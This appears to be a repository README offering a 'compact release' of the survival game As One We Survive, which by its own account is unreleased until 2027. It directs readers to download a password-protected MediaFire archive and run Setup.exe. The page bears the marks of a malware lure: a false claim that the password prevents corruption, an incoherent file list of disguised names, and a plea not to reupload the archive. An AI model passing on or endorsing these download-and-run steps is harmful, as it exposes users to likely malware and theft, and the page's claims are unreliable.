## 🕹️ About

As One We Survive is a top-down survival and community-management game set in post-apocalyptic America. Developed and published by Revelation Games LLC, it follows survivors trying to endure a grid-down, post-pandemic world by scavenging supplies, crafting equipment, building a homestead, and protecting their community. Survival depends on managing scarce resources, recruiting survivors, assigning roles, maintaining weapons, and making difficult choices in a dangerous sandbox. The game is planned for Early Access in Q1 2027, with Survival and Story modes planned. This compact release uses more efficient archive compression to reduce the download size; the game itself is unchanged and includes the same content and gameplay.

A strong fit for players who enjoy challenging top-down survival games with exploration, base building, resource management, and community-focused decisions.

## ✨ Features

- 📻 **Radio Signals** — Intercept broadcasts that reveal survivors, threats, and new opportunities.
- 🔧 **Scavenge and Craft** — Search abandoned locations for supplies and create what your community needs.
- 🌲 **Post-Apocalyptic Survival** — Explore a harsh American wilderness where food, water, medicine, and safety are limited.
- ⚔️ **Unforgiving Combat** — Choose when to fight, manage injuries, stop bleeding, and maintain reliable weapons.
- 🛖 **Homestead Building** — Claim a safe haven, construct facilities, and develop renewable resources.
- 👥 **Community Management** — Recruit survivors, assign responsibilities, and keep your growing group alive.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- uninstall.key <- Uninstall key
|-- api.pak <- API modules
|-- assets.wem <- Asset audio
|-- res.pak <- Resources archive
|-- launcher.dll <- Launcher library
|-- driver.umap <- Driver data
|-- bootstrap.wem <- Bootstrap audio
|-- installer.dat <- Installer data
|-- license.bank <- License data
|-- dlc.md5 <- DLC checksums
|-- scripts.lic <- Game scripts
|-- update_1.res <- Update resources
|-- physics.sys <- Physics engine
|-- lang.sys <- Language system
|-- global.cfg <- Global settings
|-- localization.ini <- Language files
|-- driver.pak <- Driver archive
|-- patch_1.bnk <- Audio banks
|-- animations.dll <- Animation system
|-- update_1.ini <- Update config
|-- Password 2026.txt <- Password reminder (empty)
|-- settings.bin <- Configuration
|-- audio.res <- Audio resources
|-- license.wem <- Audio assets
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start

## ❓ Frequently Asked Questions (FAQ)

**Q: What are the system requirements?**
**A:** The compact release targets the same hardware as the original game. See the System Requirements section above.

**Q: What compression format is used?**
**A:** The archive uses a standard compression format compatible with common extractors like 7-Zip, WinRAR, and WinZip.

**Q: Can I share this repository?**
**A:** Yes, you can share the link. Please don't reupload the archive itself to other platforms — keeping distribution in one place makes updates easier to track.

**Q: What is this project?**
**A:** This repository is the public project page for a compact release of the game. It's where updates, notes, and development progress are shared with the community.

**Q: What platforms are supported?**
**A:** The current focus is Windows. Other platforms are not part of the active roadmap at this time.

**Q: What should I do if extraction fails?**
**A:** Make sure you're using a recent version of your extractor and that the archive wasn't corrupted during download. If it fails, re-download the archive.

**Q: Why is the archive password-protected?**
**A:** The password prevents the archive from being corrupted during transfer and keeps the files bundled correctly. The password is provided in the download section.
